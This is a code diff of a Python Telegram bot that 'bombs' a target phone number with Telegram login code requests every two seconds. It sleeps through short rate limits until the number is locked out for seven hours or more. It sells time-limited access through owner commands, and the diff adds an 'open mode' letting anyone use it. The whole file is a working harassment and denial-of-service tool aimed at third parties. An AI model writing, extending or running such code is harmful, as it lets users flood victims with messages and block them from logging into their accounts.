@@ -1,6 +1,5 @@
 # language: Python, file: main.py, runtime: Python 3.10+
-# Onyx Limit — Telegram OTP flood bot with time-based access control
-# Railway-ready: all secrets via environment variables
+# Host-ready: reads BOT_TOKEN / API_ID / API_HASH / OWNER_IDS / OWNER_USERNAME from .env
 
 import asyncio
 import json
@@ -9,7 +8,7 @@ import os
 import re
 import time
 from collections import defaultdict
-from datetime import datetime, timezone
+from pathlib import Path
 
 from dotenv import load_dotenv
 from telegram import Update
@@ -22,25 +21,34 @@ from telegram.ext import (
 )
 from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon.errors import FloodWaitError, PhoneNumberInvalidError, PhoneNumberBannedError
+from telethon.errors import (
+    FloodWaitError,
+    PhoneNumberInvalidError,
+    PhoneNumberBannedError,
+)
 
 load_dotenv()
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-API_ID    = int(os.getenv("API_ID", "0") or "0")
-API_HASH  = os.getenv("API_HASH", "")
-OWNER_ID  = int(os.getenv("OWNER_ID", "0") or "0")
+API_ID = int(os.getenv("API_ID", "0"))
+API_HASH = os.getenv("API_HASH")
+OWNER_USERNAME = os.getenv("OWNER_USERNAME", "owner")  # shown to non-access users
+# Comma-separated owner user IDs, e.g. 123456789,987654321
+OWNER_IDS = {
+    int(x.strip())
+    for x in os.getenv("OWNER_IDS", "").split(",")
+    if x.strip().isdigit()
+}
 
 if not BOT_TOKEN or not API_ID or not API_HASH:
-    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH")
+    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH in environment or .env")
+if not OWNER_IDS:
+    raise SystemExit("Missing OWNER_IDS in environment or .env (at least one owner required)")
 
-if not OWNER_ID:
-    raise SystemExit("Missing OWNER_ID")
-
-MIN_LIMIT_HOURS = 7          # permanent stop only when wait ≥ 7 h
-SEND_INTERVAL   = 2          # seconds between successful code requests
-ACCESS_FILE     = "access.json"
+MIN_LIMIT_HOURS = 7          # permanent stop threshold
+SEND_INTERVAL = 2            # seconds between OTP requests
+DATA_FILE = Path("bot_data.json")
 
 # ─── STATE ────────────────────────────────────────────────────────────────────
 active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
@@ -50,84 +58,95 @@ logging.basicConfig(
     format="%(asctime)s - %(levelname)s - %(message)s",
     level=logging.INFO,
 )
-log = logging.getLogger("onyx_limit")
+log = logging.getLogger("otp_bot")
 
 
-# ─── ACCESS CONTROL ───────────────────────────────────────────────────────────
-def load_access() -> dict:
-    if not os.path.exists(ACCESS_FILE):
-        return {}
-    try:
-        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
-            return json.load(f)
-    except Exception:
-        return {}
+# ─── PERSISTENCE ──────────────────────────────────────────────────────────────
+def load_data() -> dict:
+    if DATA_FILE.exists():
+        try:
+            with open(DATA_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except Exception:
+            pass
+    return {"access": {}, "open_mode": False}
 
 
-def save_access(data: dict) -> None:
-    with open(ACCESS_FILE, "w", encoding="utf-8") as f:
+def save_data(data: dict) -> None:
+    with open(DATA_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2)
 
 
+def get_access() -> dict[str, float]:
+    """user_id (str) → expiry unix timestamp"""
+    return load_data().get("access", {})
+
+
+def set_access(access: dict[str, float]) -> None:
+    data = load_data()
+    data["access"] = access
+    save_data(data)
+
+
+def is_open_mode() -> bool:
+    return bool(load_data().get("open_mode", False))
+
+
+def set_open_mode(value: bool) -> None:
+    data = load_data()
+    data["open_mode"] = value
+    save_data(data)
+
+
 def is_owner(user_id: int) -> bool:
-    return user_id == OWNER_ID
+    return user_id in OWNER_IDS
 
 
 def has_access(user_id: int) -> bool:
     if is_owner(user_id):
         return True
-    data = load_access()
-    entry = data.get(str(user_id))
-    if not entry:
+    if is_open_mode():
+        return True
+    access = get_access()
+    key = str(user_id)
+    if key not in access:
         return False
-    return time.time() < entry.get("expires", 0)
+    if time.time() > access[key]:
+        # expired — clean up
+        del access[key]
+        set_access(access)
+        return False
+    return True
 
 
 def days_left(user_id: int) -> float:
-    if is_owner(user_id):
-        return float("inf")
-    data = load_access()
-    entry = data.get(str(user_id))
-    if not entry:
+    access = get_access()
+    key = str(user_id)
+    if key not in access:
         return 0.0
-    remaining = entry.get("expires", 0) - time.time()
+    remaining = access[key] - time.time()
     return max(0.0, remaining / 86400)
 
 
 # ─── WORKER ───────────────────────────────────────────────────────────────────
 async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
     """
-    Keep requesting codes until a FloodWait ≥ MIN_LIMIT_HOURS is hit.
-    Short FloodWaits (< 7 h) → sleep the wait, then resume.
-    Already-limited numbers (any FloodWait on first try) → stop + report.
+    Keep requesting OTP every SEND_INTERVAL seconds.
+    - Any FloodWait on a number that is already rate-limited → stop + show remaining time.
+    - Short FloodWait (< MIN_LIMIT_HOURS) while the number is still fresh → sleep and resume.
+    - FloodWait ≥ MIN_LIMIT_HOURS → permanent stop for this job.
     """
-    first_attempt = True
-
     while True:
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         try:
             await client.connect()
             await client.send_code_request(phone)
             log.info("OTP sent → %s (user %s)", phone, user_id)
-            first_attempt = False
-
         except FloodWaitError as e:
             wait = e.seconds
-            hours = wait / 3600
-
-            if first_attempt:
-                # Number was already limited when the job started
-                msg = (
-                    f"🚫 OTP Sending Stopped!\n"
-                    f"Number: {phone}\n"
-                    f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
-                    f"before trying this number again.\n"
-                    f"Stopping the process."
-                )
-                await bot.send_message(chat_id, msg)
-                break
-
-            # Not the first attempt → we hit a limit while running
+            hours = wait / 3600.0
+            # Any FloodWait means the number is currently limited.
+            # Permanent stop only when remaining wait ≥ MIN_LIMIT_HOURS.
             if hours >= MIN_LIMIT_HOURS:
                 msg = (
                     f"🚫 OTP Sending Stopped!\n"
@@ -139,31 +158,22 @@ async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
                 await bot.send_message(chat_id, msg)
                 break
             else:
-                # Short limit → wait it out, then continue
+                # Short limit — sleep the exact wait, then resume.
                 log.info(
-                    "Short FloodWait %.1fh on %s — sleeping %ss then resume",
-                    hours, phone, wait,
-                )
-                await bot.send_message(
-                    chat_id,
-                    f"⏳ Short rate-limit on {phone}: waiting {hours:.1f} h then resuming…",
+                    "Short FloodWait %ss (%.2fh) on %s — sleeping then resume",
+                    wait, hours, phone,
                 )
                 await asyncio.sleep(wait)
-                first_attempt = False
                 continue
-
         except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
             await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
             break
-
         except asyncio.CancelledError:
             raise
-
         except Exception as ex:
             log.warning("Transient error on %s: %s", phone, ex)
             await asyncio.sleep(5)
             continue
-
         finally:
             try:
                 await client.disconnect()
@@ -172,7 +182,7 @@ async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
 
         await asyncio.sleep(SEND_INTERVAL)
 
-    # Cleanup
+    # Cleanup job entry
     if phone in active_jobs.get(user_id, {}):
         del active_jobs[user_id][phone]
         if not active_jobs[user_id]:
@@ -187,32 +197,37 @@ def is_valid_phone(text: str) -> bool:
 async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
     phone = phone.strip()
     if not is_valid_phone(phone):
-        return "❌ Invalid phone number format. Include country code (e.g. +919876543210)."
+        return (
+            "❌ Invalid phone number format. "
+            "Please include the country code (e.g., +919876543210)."
+        )
 
     if phone in active_jobs.get(user_id, {}):
-        return f"⚠️ Already running on {phone}. Use /stop {phone} to cancel."
+        return (
+            f"⚠️ You are already bombing {phone}! "
+            f"To stop it, use /stop {phone}."
+        )
 
     task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
     active_jobs[user_id][phone] = task
 
     return (
-        f"🚀 Onyx Limit started on {phone}\n"
-        f"Sending every {SEND_INTERVAL}s.\n"
-        f"Short limits (< {MIN_LIMIT_HOURS} h) → wait & resume.\n"
-        f"Long limits (≥ {MIN_LIMIT_HOURS} h) → permanent stop."
+        f"🚀 Started sending OTPs to {phone}!\n"
+        f"I will keep sending every {SEND_INTERVAL} seconds until a ≥{MIN_LIMIT_HOURS}h "
+        f"limit is reached or you use /stop."
     )
 
 
 async def stop_jobs(user_id: int, phone: str | None = None) -> str:
     jobs = active_jobs.get(user_id, {})
     if not jobs:
-        return "⚠️ No active processes found."
+        return "⚠️ No active processes found for you."
 
     if phone:
         phone = phone.strip()
         task = jobs.pop(phone, None)
         if task is None:
-            return f"⚠️ No active process for {phone}."
+            return f"⚠️ No active process found for {phone}."
         task.cancel()
         try:
             await task
@@ -220,7 +235,7 @@ async def stop_jobs(user_id: int, phone: str | None = None) -> str:
             pass
         if not jobs:
             del active_jobs[user_id]
-        return f"🛑 Stopped process for {phone}."
+        return "🛑 Stopped 1 active OTP process."
 
     count = len(jobs)
     for t in list(jobs.values()):
@@ -231,115 +246,96 @@ async def stop_jobs(user_id: int, phone: str | None = None) -> str:
         except asyncio.CancelledError:
             pass
     del active_jobs[user_id]
-    return f"🛑 Stopped {count} active process(es)."
+    return f"🛑 Stopped {count} active OTP process(es)."
 
 
-# ─── ACCESS DECORATORS ────────────────────────────────────────────────────────
-def require_access(func):
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        if not has_access(user.id):
-            await update.message.reply_text(
-                "⛔ Access denied.\n\n"
-                "This bot is private. Contact the owner whose username is listed "
-                "in the bot’s bio to request access."
-            )
-            return
-        return await func(update, context)
-    return wrapper
-
-
-def require_owner(func):
-    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not is_owner(update.effective_user.id):
-            await update.message.reply_text("⛔ Owner only.")
-            return
-        return await func(update, context)
-    return wrapper
+def access_denied_text() -> str:
+    return (
+        "🔒 Access denied.\n"
+        f"Contact the owner @{OWNER_USERNAME} to get access."
+    )
 
 
 # ─── HANDLERS ─────────────────────────────────────────────────────────────────
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    if not has_access(user.id):
-        await update.message.reply_text(
-            "⛔ Access denied.\n\n"
-            "Onyx Limit is a private service.\n"
-            "Contact the owner whose username is listed in the bot’s bio to request access."
-        )
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text())
         return
 
-    left = days_left(user.id)
-    if left == float("inf"):
-        access_line = "🔑 Owner access (unlimited)"
-    else:
-        access_line = f"⏳ Access remaining: {left:.1f} day(s)"
-
     text = (
-        f"🖤 <b>Onyx Limit</b>\n"
-        f"Professional OTP rate-limit tool\n\n"
-        f"{access_line}\n\n"
-        f"<b>Private chat</b>\n"
-        f"Just send a number → <code>+919876543210</code>\n\n"
-        f"<b>Group chat</b>\n"
-        f"<code>/spam +919876543210</code>\n\n"
-        f"<b>Control</b>\n"
-        f"<code>/stop</code> — stop all\n"
-        f"<code>/stop +number</code> — stop one number\n\n"
-        f"• Already-limited numbers → immediate stop + exact wait time\n"
-        f"• Short limits (&lt; {MIN_LIMIT_HOURS} h) → wait & resume\n"
-        f"• Long limits (≥ {MIN_LIMIT_HOURS} h) → permanent stop"
+        "👋 Welcome to the OTP Bot.\n\n"
+        "This bot sends OTPs to a phone number every 2 seconds until a long rate-limit is hit.\n\n"
+        "📌 Private chat: just send the phone number (with country code).\n"
+        "📌 Group chat: /spam +919876543210\n"
+        "/stop — stop all your jobs\n"
+        "/stop +919876543210 — stop one number\n"
     )
-    await update.message.reply_text(text, parse_mode="HTML")
+    if is_owner(uid):
+        text += (
+            "\n── Owner commands ──\n"
+            "/adduser <user_id> <days>\n"
+            "/removeuser <user_id>\n"
+            "/showuser\n"
+            "/open  — allow everyone\n"
+            "/lock  — restrict to accessed users only\n"
+        )
+    await update.message.reply_text(text)
 
 
-@require_access
 async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text())
+        return
+
     if not context.args:
         await update.message.reply_text("Usage: /spam +919876543210")
         return
     phone = context.args[0]
-    reply = await start_job(
-        update.effective_user.id,
-        phone,
-        update.effective_chat.id,
-        context.bot,
-    )
+    reply = await start_job(uid, phone, update.effective_chat.id, context.bot)
     await update.message.reply_text(reply)
 
 
-@require_access
 async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text())
+        return
+
     phone = context.args[0] if context.args else None
-    reply = await stop_jobs(update.effective_user.id, phone)
+    reply = await stop_jobs(uid, phone)
     await update.message.reply_text(reply)
 
 
-@require_access
 async def private_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type != "private":
         return
+    uid = update.effective_user.id
+    if not has_access(uid):
+        await update.message.reply_text(access_denied_text())
+        return
+
     text = update.message.text.strip()
     if not text.startswith("+"):
         return
-    reply = await start_job(
-        update.effective_user.id,
-        text,
-        update.effective_chat.id,
-        context.bot,
-    )
+    reply = await start_job(uid, text, update.effective_chat.id, context.bot)
     await update.message.reply_text(reply)
 
 
 # ─── OWNER COMMANDS ───────────────────────────────────────────────────────────
-@require_owner
 async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text("❌ Owners only.")
+        return
+
     if len(context.args) < 2:
         await update.message.reply_text("Usage: /adduser <user_id> <days>")
         return
 
     try:
-        uid = int(context.args[0])
+        target = int(context.args[0])
         days = float(context.args[1])
         if days <= 0:
             raise ValueError
@@ -347,71 +343,91 @@ async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ user_id must be integer, days must be positive number.")
         return
 
-    data = load_access()
-    now = time.time()
-    expires = now + (days * 86400)
-
-    data[str(uid)] = {
-        "expires": expires,
-        "added": now,
-        "days_granted": days,
-    }
-    save_access(data)
-
-    exp_str = datetime.fromtimestamp(expires, tz=timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
+    access = get_access()
+    access[str(target)] = time.time() + days * 86400
+    set_access(access)
     await update.message.reply_text(
-        f"✅ Access granted\n"
-        f"User ID: <code>{uid}</code>\n"
-        f"Days: {days}\n"
-        f"Expires: {exp_str}",
-        parse_mode="HTML",
+        f"✅ User {target} granted access for {days} day(s).\n"
+        f"Expires in {days_left(target):.1f} days."
     )
 
 
-@require_owner
 async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text("❌ Owners only.")
+        return
+
     if not context.args:
         await update.message.reply_text("Usage: /removeuser <user_id>")
         return
 
     try:
-        uid = int(context.args[0])
+        target = int(context.args[0])
     except ValueError:
-        await update.message.reply_text("❌ user_id must be integer.")
+        await update.message.reply_text("❌ user_id must be an integer.")
         return
 
-    data = load_access()
-    if str(uid) not in data:
-        await update.message.reply_text(f"⚠️ User {uid} not in access list.")
-        return
+    access = get_access()
+    key = str(target)
+    if key in access:
+        del access[key]
+        set_access(access)
+        await update.message.reply_text(f"✅ User {target} removed.")
+    else:
+        await update.message.reply_text(f"⚠️ User {target} was not in the access list.")
 
-    del data[str(uid)]
-    save_access(data)
-    await update.message.reply_text(f"🗑️ Access removed for <code>{uid}</code>", parse_mode="HTML")
 
-
-@require_owner
 async def cmd_showuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    data = load_access()
-    if not data:
-        await update.message.reply_text("No users in access list.")
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text("❌ Owners only.")
         return
 
-    lines = ["📋 <b>Access List</b>\n"]
+    access = get_access()
+    if not access:
+        await update.message.reply_text("No accessed users.")
+        return
+
+    lines = ["📋 Accessed users:"]
     now = time.time()
-
-    for uid_str, entry in sorted(data.items(), key=lambda x: x[1].get("expires", 0)):
-        uid = int(uid_str)
-        expires = entry.get("expires", 0)
-        remaining = max(0, expires - now)
+    # clean expired while listing
+    expired = []
+    for key, exp in access.items():
+        remaining = exp - now
+        if remaining <= 0:
+            expired.append(key)
+            continue
         days = remaining / 86400
-        status = "✅" if remaining > 0 else "❌ EXPIRED"
-        exp_str = datetime.fromtimestamp(expires, tz=timezone.utc).strftime("%Y-%m-%d")
-        lines.append(
-            f"{status} <code>{uid}</code> — {days:.1f}d left (until {exp_str})"
-        )
+        lines.append(f"• ID: {key}  —  {days:.1f} day(s) left")
 
-    await update.message.reply_text("\n".join(lines), parse_mode="HTML")
+    for key in expired:
+        del access[key]
+    if expired:
+        set_access(access)
+
+    if len(lines) == 1:
+        await update.message.reply_text("No accessed users (all expired).")
+    else:
+        await update.message.reply_text("\n".join(lines))
+
+
+async def cmd_open(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text("❌ Owners only.")
+        return
+    set_open_mode(True)
+    await update.message.reply_text("🔓 Bot is now OPEN — anyone can use it.")
+
+
+async def cmd_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if not is_owner(uid):
+        await update.message.reply_text("❌ Owners only.")
+        return
+    set_open_mode(False)
+    await update.message.reply_text("🔒 Bot is now LOCKED — only accessed users + owners.")
 
 
 # ─── MAIN ─────────────────────────────────────────────────────────────────────
@@ -424,9 +440,11 @@ def main():
     app.add_handler(CommandHandler("adduser", cmd_adduser))
     app.add_handler(CommandHandler("removeuser", cmd_removeuser))
     app.add_handler(CommandHandler("showuser", cmd_showuser))
+    app.add_handler(CommandHandler("open", cmd_open))
+    app.add_handler(CommandHandler("lock", cmd_lock))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, private_number))
 
-    log.info("Onyx Limit starting… (MIN_LIMIT_HOURS=%s)", MIN_LIMIT_HOURS)
+    log.info("Bot starting… owners=%s open_mode=%s", OWNER_IDS, is_open_mode())
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 
